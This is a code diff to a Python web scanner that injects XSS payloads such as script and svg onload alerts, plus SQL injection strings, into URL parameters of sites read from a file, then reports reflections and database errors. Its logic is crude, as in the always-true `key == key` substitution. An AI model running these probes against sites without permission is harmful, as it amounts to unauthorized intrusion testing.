@@ -10,11 +10,11 @@ print(colored(ascii_banner, "light_blue"))
 
 # Common XSS payloads
 xss_payloads = [
-    "<script>alert(1)</script>",
-    "'><script>alert(1)</script>",
-    "\" onmouseover=alert(1) x=\"",
-    "<img src=x onerror=alert(1)>",
-    "'\"><svg/onload=alert(1)>"
+    "<script>alert('XSS')</script>",
+    "'><script>alert('XSS')</script>",
+    "\" onmouseover=alert('XSS') x=\"",
+    "<img src=x onerror=alert('XSS')>",
+    "'\"><svg/onload=alert('XSS')>"
 ]
 
 # Common SQL Injection payloads
@@ -36,7 +36,8 @@ def load_websites(file_name):
         return [line.strip() for line in file if line.strip()]
 
 # Test XSS injection points
-def test_url_parameters_xss(url):
+def test_xss(url):
+    xss_results = []
     for payload in xss_payloads:
         if "?" in url:
             base_url, params = url.split("?", 1)
@@ -47,17 +48,18 @@ def test_url_parameters_xss(url):
                 try:
                     response = requests.get(base_url, params=modified_params, timeout=10)
                     if payload in response.text:
-                        return {
+                        xss_results.append({
                             "url": response.url,
                             "payload": payload,
                             "parameter": key
-                        }
+                        })
                 except requests.exceptions.RequestException as e:
                     print(colored(f"[XSS TEST] Error testing {url}: {e}", "red"))
-    return None
+    return xss_results
 
 # Test SQL Injection vulnerabilities
-def test_url_parameters_sql(url):
+def test_sql(url):
+    sql_results = []
     for payload in sql_payloads:
         if "?" in url:
             base_url, params = url.split("?", 1)
@@ -67,24 +69,25 @@ def test_url_parameters_sql(url):
                 modified_params = {key: (payload if key == key else value) for key, value in [p.split("=") for p in params]}
                 try:
                     response = requests.get(base_url, params=modified_params, timeout=10)
-                    if "error" in response.text.lower() or "syntax" in response.text.lower():
-                        exploitable = test_exploitability(base_url, modified_params)
-                        return {
+                    if "syntax error" in response.text.lower() or "mysql" in response.text.lower():
+                        exploitable = verify_exploitability(base_url, modified_params)
+                        sql_results.append({
                             "url": response.url,
+                            "payload": payload,
                             "exploitable": exploitable
-                        }
+                        })
                 except requests.exceptions.RequestException as e:
                     print(colored(f"[SQL TEST] Error testing {url}: {e}", "red"))
-    return None
+    return sql_results
 
-# Verify exploitability
-def test_exploitability(base_url, params):
+# Verify exploitability for SQL Injection
+def verify_exploitability(base_url, params):
     try:
         response = requests.get(base_url, params=params, timeout=10)
         if "syntax" in response.text.lower() or "mysql" in response.text.lower():
             return True
     except requests.exceptions.RequestException:
-        return False
+        pass
     return False
 
 # Discover links within a website
@@ -120,19 +123,21 @@ def scan_websites(file_name):
             print(colored(f"Scanning URL: {url}", "light_blue"))
 
             # Test XSS vulnerabilities
-            xss_result = test_url_parameters_xss(url)
-            if xss_result:
+            xss_results = test_xss(url)
+            if xss_results:
                 print(colored("[XSS Found!]", "yellow"))
-                print(colored(f"URL: {xss_result['url']} | Parameter: {xss_result['parameter']} | Payload: {xss_result['payload']}", "green"))
+                for result in xss_results:
+                    print(colored(f"URL: {result['url']} | Parameter: {result['parameter']} | Payload: {result['payload']}", "green"))
             else:
                 print(colored("No XSS vulnerabilities found.", "red"))
 
             # Test SQL Injection vulnerabilities
-            sql_result = test_url_parameters_sql(url)
-            if sql_result:
-                exploitable_status = "Exploitable" if sql_result["exploitable"] else "Not Exploitable"
+            sql_results = test_sql(url)
+            if sql_results:
                 print(colored("[SQL Injection Found!]", "yellow"))
-                print(colored(f"URL: {sql_result['url']} | Status: {exploitable_status}", "green"))
+                for result in sql_results:
+                    exploitable_status = "Exploitable" if result["exploitable"] else "Not Exploitable"
+                    print(colored(f"URL: {result['url']} | Payload: {result['payload']} | Status: {exploitable_status}", "green"))
             else:
                 print(colored("No SQL Injection vulnerabilities found.", "red"))
 
